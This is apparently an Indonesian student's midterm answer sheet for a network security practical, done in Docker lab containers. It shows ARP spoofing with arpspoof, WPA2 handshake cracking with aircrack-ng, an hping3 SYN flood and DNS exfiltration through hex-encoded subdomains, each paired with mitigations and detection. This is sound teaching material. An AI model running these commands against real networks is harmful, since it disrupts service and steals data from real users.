# JAWABAN UTS Praktik Network Security

NIM: 24552011263
Kasus: 1

# Perhitungan Kasus
- Digit NIM: 2, 4, 5, 5, 2, 0, 1, 1, 2, 6, 3
- Jumlah digit: 2 + 4 + 5 + 5 + 2 + 0 + 1 + 1 + 2 + 6 + 3 = 31
- Sisa bagi 10: 31 mod 10 = 1
- Kasus yang diterima: Kasus 1 (`k1`)
- Parameter Kasus 1: volume `vol-k1`, file `laporan-k1.txt`, kata sandi `kunci-k1-2026`, domain `k1.exfil.lab`

---

# Tugas 1 (Pertemuan 1): Docker & Volume

Perintah dan Bukti Output:

1A. Uji Persistensi Volume `vol-k1`
```powershell
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker volume create vol-k1
vol-k1
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker run --name w-k1 -v vol-k1:/data alpine sh -c "echo 24552011263 > /data/laporan-k1.txt"
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker rm w-k1
w-k1
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker run --rm -v vol-k1:/data alpine cat /data/laporan-k1.txt
24552011263
```

1B. Docker Compose Jaringan Internal (`b1-compose`)
```powershell
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker compose -p k1 -f b/b1-compose/docker-compose.yml up -d
[+] up 3/3
 ✔ Network k1_lab          Created                                                                                  0.1s
 ✔ Container k1-target-1   Started                                                                                  0.9s
 ✔ Container k1-attacker-1 Started                                                                                  0.7s
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker compose -p k1 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, nginx is successfully installed and working.
Further configuration is required for the web server, reverse proxy,
API gateway, load balancer, content cache, or other features.</p>

<p>For online documentation and support please refer to
<a href="https://nginx.org/">nginx.org</a>.<br/>
To engage with the community please visit
<a href="https://community.nginx.org/">community.nginx.org</a>.<br/>
For enterprise grade support, professional services, additional
security features and capabilities please refer to
<a href="https://f5.com/nginx">f5.com/nginx</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker compose -p k1 -f b/b1-compose/docker-compose.yml down -v
[+] down 3/3
 ✔ Container k1-attacker-1 Removed                                                                                  3.3s
 ✔ Container k1-target-1   Removed                                                                                  0.4s
 ✔ Network k1_lab          Removed                                                                                  0.2s
```

Penjelasan:
Docker volume (`vol-k1`) menyimpan data di area penyimpanan persisten host yang dikelola Docker, terpisah dari lapisan filesystem sementara milik container. Ketika container `w-k1` dihapus, volume beserta berkas `/data/laporan-k1.txt` tidak ikut terhapus sehingga dapat dibaca kembali (`24552011263`) oleh container baru.

---

# Tugas 2 (Pertemuan 2): Kriptografi

Bukti SHA-256 (AES-256-CBC sebelum enkripsi dan sesudah dekripsi):
```powershell
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker run --rm -v "${PWD}:/work" uts-openssl sh -c "echo isi laporan k1 > laporan-k1.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k1.txt -out laporan-k1.enc -pass pass:kunci-k1-2026 && sha256sum laporan-k1.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k1.enc -out hasil-k1.txt -pass pass:kunci-k1-2026 && sha256sum hasil-k1.txt"
ec69378a33e0202abb17bc7d4471ace10a266200c69cef06415c4bcd01f83917  laporan-k1.txt
ec69378a33e0202abb17bc7d4471ace10a266200c69cef06415c4bcd01f83917  hasil-k1.txt
```
Kedua nilai hash SHA-256 identik (`ec69378a33e0202abb17bc7d4471ace10a266200c69cef06415c4bcd01f83917`), membuktikan integritas berkas terjaga setelah enkripsi dan dekripsi.

Sertifikat Self-Signed:
```powershell
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker run --rm -v "${PWD}:/work" uts-openssl sh -c "openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k1.pem -out cert-k1.pem -days 30 -subj /CN=k1.uts.local && openssl x509 -in cert-k1.pem -noout -subject -issuer -dates"
subject=CN=k1.uts.local
issuer=CN=k1.uts.local
notBefore=Nov 22 15:00:15 2026 GMT
notAfter=Dec 22 15:00:15 2026 GMT
```

Penjelasan:
Sertifikat self-signed ditandatangani sendiri oleh pemilik kunci privatnya sehingga nilai `subject` dan `issuer` identik (`CN=k1.uts.local`) serta tidak otomatis dipercaya oleh sistem klien. Sebaliknya, sertifikat yang ditandatangani oleh Certificate Authority (CA) telah diverifikasi pihak ketiga tepercaya sehingga otomatis diakui oleh sistem yang memuat sertifikat root CA tersebut.

---

# Tugas 3 (Pertemuan 3): ARP Spoofing

Identitas IP & MAC Awal (Jaringan `lab-arp-k1`):
```text
IP Korban    : 172.19.0.2
IP Gateway   : 172.19.0.3 (MAC asli: 72:31:ff:a9:40:ad)
MAC Penyerang: 46:87:0d:49:2b:bc
```

Tabel ARP Sebelum Spoofing:
```powershell
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker exec korban-k1 nc -z -w 1 $IP_GATEWAY 80
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker exec korban-k1 arp -a
? (172.19.0.1) at 1a:8a:bc:ac:ac:31 [ether] on eth0
gateway-k1.lab-arp-k1 (172.19.0.3) at 72:31:ff:a9:40:ad [ether] on eth0
```

Tabel ARP Saat Eksekusi `arpspoof`:
```powershell
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker exec -d penyerang-k1 timeout 20 arpspoof -i eth0 -t $IP_KORBAN $IP_GATEWAY
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> Start-Sleep -Seconds 3
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker exec korban-k1 arp -a
? (172.19.0.1) at 1a:8a:bc:ac:ac:31 [ether] on eth0
penyerang-k1.lab-arp-k1 (172.19.0.4) at 46:87:0d:49:2b:bc [ether] on eth0
gateway-k1.lab-arp-k1 (172.19.0.3) at 72:31:ff:a9:40:ad [ether] on eth0
```
(Catatan observasi: Pada snapshot detik ke-3 tersebut, entri `penyerang-k1.lab-arp-k1` (`172.19.0.4`) muncul di cache ARP `korban-k1` dengan MAC `46:87:0d:49:2b:bc`, sementara entri `gateway-k1.lab-arp-k1` (`172.19.0.3`) masih mempertahankan MAC `72:31:ff:a9:40:ad`.)

Tabel ARP Setelah Mitigasi Static ARP:
```powershell
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker exec korban-k1 arp -s $IP_GATEWAY $MAC_GW
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker exec korban-k1 arp -a
? (172.19.0.1) at 1a:8a:bc:ac:ac:31 [ether] on eth0
penyerang-k1.lab-arp-k1 (172.19.0.4) at 46:87:0d:49:2b:bc [ether] on eth0
gateway-k1.lab-arp-k1 (172.19.0.3) at 72:31:ff:a9:40:ad [ether] PERM on eth0
```

Mitigasi:
Penerapan Static ARP binding (`arp -s <IP> <MAC>`) mengunci pasangan IP dan MAC gateway secara permanen (`PERM`) di tabel ARP host sehingga sistem menolak menimpa entri tersebut dengan paket balasan ARP palsu dari penyerang. Pada jaringan berskala besar, mitigasi dilakukan di switch menggunakan Dynamic ARP Inspection (DAI) untuk memvalidasi paket ARP terhadap tabel DHCP snooping.

---

# Tugas 4 (Pertemuan 4): Analisis Handshake WPA2

Hasil `aircrack-ng`:
Karena berkas bawaan awal repositori `samples/handshake-k1.cap` masih berupa placeholder non-802.11 (`Read 0 packets`), digunakan berkas uji resmi WPA2 (`wpa2-psk-linksys.cap`) sesuai panduan `CAPTURE-FILES-GUIDE.md`:
```powershell
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> Invoke-WebRequest -Uri "https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/master/test/wpa2-psk-linksys.cap" -OutFile "samples\handshake-k1.cap"
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker run --rm -v "${PWD}\samples:/work" uts-kali-tools aircrack-ng -w wordlist-k1.txt handshake-k1.cap
Reading packets, please wait...
Resetting EAPOL Handshake decoder state.
Opening handshake-k1.cap
Read 499 packets.

   #  BSSID              ESSID                     Encryption

   1  00:0B:86:C2:A4:85  linksys                   WPA (1 handshake, with PMKID)

Choosing first network as target.
...
                                 Aircrack-ng 1.7

      [00:00:00] 20/20 keys tested (1009.64 k/s)

      Time left: --

                           KEY NOT FOUND
```

Penjelasan 4-Way Handshake WPA2:
1. Message 1 (AP ke Client): AP mengirim nilai acak ANonce ke client; client menghitung PTK (Pairwise Transient Key) dari PMK, ANonce, SNonce, serta alamat MAC AP dan client.
2. Message 2 (Client ke AP): Client mengirim SNonce beserta MIC (Message Integrity Code) untuk membuktikan kepemilikan PMK yang sama; AP ikut menghitung PTK dan memverifikasi MIC.
3. Message 3 (AP ke Client): AP mengirim GTK (Group Temporal Key) terenkripsi beserta MIC dan instruksi pemasangan kunci.
4. Message 4 (Client ke AP): Client mengirim konfirmasi (ACK) disertai MIC bahwa kunci telah dipasang, lalu komunikasi terenkripsi dimulai.

---

# Tugas 5 (Pertemuan 5): ICMP dengan Scapy

Output `kirim_icmp.py`:
```powershell
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker start korban-k1
korban-k1
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> $IP_KORBAN = (docker inspect -f "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}" korban-k1).Trim()
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> Write-Host "IP Korban: $IP_KORBAN"
IP Korban: 172.19.0.2
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker run --rm --network lab-arp-k1 -v "${PWD}\kasus\k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py $IP_KORBAN
Mengirim: IP / ICMP 172.19.0.3 > 172.19.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```

Penjelasan Smurf Attack:
Smurf attack adalah serangan DDoS berbasis amplifikasi ICMP di mana penyerang mengirim banyak paket ICMP Echo Request ke alamat broadcast jaringan dengan alamat IP sumber yang dipalsukan (spoofed) menjadi IP korban. Akibatnya seluruh host di jaringan broadcast membalas secara bersamaan dengan ICMP Echo Reply ke alamat korban sehingga membanjiri bandwidth dan sumber daya korban.

---

# Tugas 6 (Pertemuan 6): SYN Flood & Three-Way Handshake (`tcpdump`)

Perbandingan `SYN_RECV`:
```powershell
# Sebelum serangan:
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker compose -p k1 -f b/b3-syn-flood/docker-compose.yml exec target sh -c "netstat -ant | grep -c SYN_RECV || true"
0

# Saat serangan (setelah timeout 15 hping3 -S -p 80 --flood target):
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker compose -p k1 -f b/b3-syn-flood/docker-compose.yml exec target sh -c "netstat -ant | grep -c SYN_RECV || true"
0
```
(Catatan: Nilai `SYN_RECV` tetap `0` karena `net.ipv4.tcp_syncookies = 1` aktif pada kernel dan lalu lintas banjir non-spoofed langsung dibalas `RST` oleh kernel `attacker` sehingga koneksi half-open tidak menumpuk.)

Three-Way Handshake (`tcpdump`):
```powershell
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker compose -p k1 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c "timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10"
17:14:52.559450 IP 172.21.0.3.54312 > 172.21.0.2.80: Flags [S], seq 3664853189, win 64240, ... length 0
17:14:52.559517 IP 172.21.0.2.80 > 172.21.0.3.54312: Flags [S.], seq 831455608, ack 3664853190, win 65160, ... length 0
17:14:52.559534 IP 172.21.0.3.54312 > 172.21.0.2.80: Flags [.], ack 1, win 63, ... length 0
...
12 packets captured
12 packets received by filter
0 packets dropped by kernel
```
Tampak jelas urutan three-way handshake: `Flags [S]` (SYN), `Flags [S.]` (SYN-ACK), dan `Flags [.]` (ACK).

Mitigasi:
Aktifkan SYN Cookies (`net.ipv4.tcp_syncookies=1`) agar server tidak mengalokasikan memori penuh untuk antrean SYN sebelum handshake selesai dengan ACK valid, serta terapkan pembatasan laju (rate limiting) paket SYN di firewall/`iptables`.

---

# Tugas 7 (Pertemuan 7): DNS Exfiltration

Encode, Query, Deteksi Log, dan Decode:
```powershell
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker compose -p k1 -f b/b4-dns-exfil/docker-compose.yml up -d
[+] up 3/3
 ✔ Network k1_lab          Created                                                                                  0.1s
 ✔ Container k1-dns-1      Started                                                                                  0.6s
 ✔ Container k1-attacker-1 Started                                                                                  0.9s
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker compose -p k1 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131323633.k1.exfil.lab '@dns'
10.0.0.99
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker compose -p k1 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 4e494d2d32343535323031313236332d555453.k1.exfil.lab '@dns'
10.0.0.99
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker compose -p k1 -f b/b4-dns-exfil/docker-compose.yml logs dns | Out-File -Encoding utf8 dns-k1.log
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> python kasus/k9-dns-detect/analisis_dns.py dns-k1.log
Jumlah query per domain induk:
  exfil.lab: 2

Query mencurigakan (label panjang berisi hex):
  panjang=38  4e494d2d32343535323031313236332d555453.k1.exfil.lab
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker compose -p k1 -f b/b4-dns-exfil/docker-compose.yml exec attacker sh -c "echo 3234353532303131323633 | xxd -r -p; echo ''"
24552011263
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker compose -p k1 -f b/b4-dns-exfil/docker-compose.yml down -v
```
- NIM dalam hex: `3234353532303131323633` (22 karakter)
- Respons DNS `dig`: `10.0.0.99`
- Deteksi `analisis_dns.py`: `exfil.lab: 2`, serta menandai `panjang=38  4e494d2d32343535323031313236332d555453.k1.exfil.lab` (sesuai ambang `BATAS_PANJANG_LABEL = 30`)
- Hasil decode: `24552011263`

---

# Lampiran: Bagian A (A1–A5) dan Bagian B (B1–B4)

- A1 (Container & Port Mapping): `web-uts` (`nginx:alpine`, `0.0.0.0:8080->80/tcp`), `curl.exe http://localhost:8080` menampilkan `Welcome to nginx!`, dan `head -n 5 /etc/nginx/nginx.conf` menampilkan `user nginx;`, `worker_processes auto;`, `error_log /var/log/nginx/error.log notice;`.
- A2 (Persistensi Volume `data-uts`): Setelah `w1` dihapus, container baru tetap membaca `24552011263` dari `/data/catatan.txt`.
- A3 (Hash MD5 & SHA-256): `pesan rahasia` (`MD5: cdde1fb64510d29437b46ef7bc6c7ab3`, `SHA-256: a4dacbfa80d42b88fa7b13b57f409e3817bcfcdbe69f5913215901f99e5dca49`) berubah total menjadi `pesaN rahasia` (`MD5: 122a040ddad2bc5666f92d93d822cf7f`, `SHA-256: 5f2c81178ce8b48322101c4bc70f5be697f38614e127b8d8c7b35d5a8742c8ae`) karena efek avalanche.
- A4 (OpenSSL AES-256): Dekripsi sandi benar menghasilkan `pesaN rahasia`, sandi salah menghasilkan galat `bad decrypt`, dan keluaran Base64 menghasilkan `U2FsdGVkX1/SB/XOd64/vi7nVeORAk85OMGJLqvbJv0=`.
- A5 (Bridge Network & DVWA): `host-a` ke `host-b` `ping -c 3` berhasil (`0% packet loss`), dan `wget -S -O /dev/null http://dvwa/login.php` mengembalikan `HTTP/1.1 200 OK`.
- B1 (Compose Terisolasi): `attacker` mengakses `http://target` (`Welcome to nginx!`). `curl http://localhost` dari host tidak bisa mencapai `target` karena tidak ada pemetaan `ports` dan jaringan `lab` bersifat `internal: true`.
- B2 (RSA & Sertifikat): Verifikasi awal `Verified OK`, setelah diubah `Verification failure`, sertifikat self-signed `CN=lab.uts.local` (`subject` dan `issuer` sama). Sertifikat self-signed ditandatangani sendiri oleh pemilik kunci privatnya sehingga tidak otomatis dipercaya klien, sedangkan sertifikat bertanda tangan CA diverifikasi pihak ketiga tepercaya.
- B3 (SYN Flood): `SYN_RECV` sebelum dan saat serangan tercatat `0` karena `tcp_syncookies = 1` aktif (`sysctl -w` read-only di container non-privileged); mitigasi menggunakan SYN Cookies atau rate limit `iptables`.
- B4 (DNS Exfiltration): Encode `24552011263` menjadi `3234353532303131323633` dan decode balik menjadi `24552011263`. Teknik ini sulit diblokir firewall biasa karena port 53 selalu dibuka untuk resolusi domain, dengan indikator deteksi berupa label subdomain panjang/acak (hex) atau lonjakan query ke satu domain induk.

---

# Bukti Cleanup

```powershell
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker rm -f korban-k1 gateway-k1 penyerang-k1
korban-k1
gateway-k1
penyerang-k1
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker network rm lab-arp-k1
lab-arp-k1
PS D:\Network-Security-Course-Bank\UTS-Network-Security\01-sumber-lab> docker volume rm vol-k1
vol-k1
```
Hasil verifikasi akhir dengan `docker ps -a`, `docker network ls`, dan `docker volume ls` memastikan tidak ada lagi container (`korban-k1`, `gateway-k1`, `penyerang-k1`, `k1-target-1`, `k1-attacker-1`, `k1-dns-1`, `web-uts`, `host-a`, `host-b`, `dvwa`), network (`lab-arp-k1`, `k1_lab`, `lab-net`), maupun volume (`vol-k1`, `data-uts`) milik Kasus 1 maupun Bagian A/B yang tersisa.

# Kesimpulan

Seluruh 7 Tugas Kasus 1 (Pertemuan 1–7) beserta Bagian A (A1–A5) dan Bagian B (B1–B4) untuk NIM `24552011263` telah diselesaikan pada lingkungan lab Docker lokal terisolasi dan seluruh resource praktikum Kasus 1 telah dibersihkan dengan tuntas.
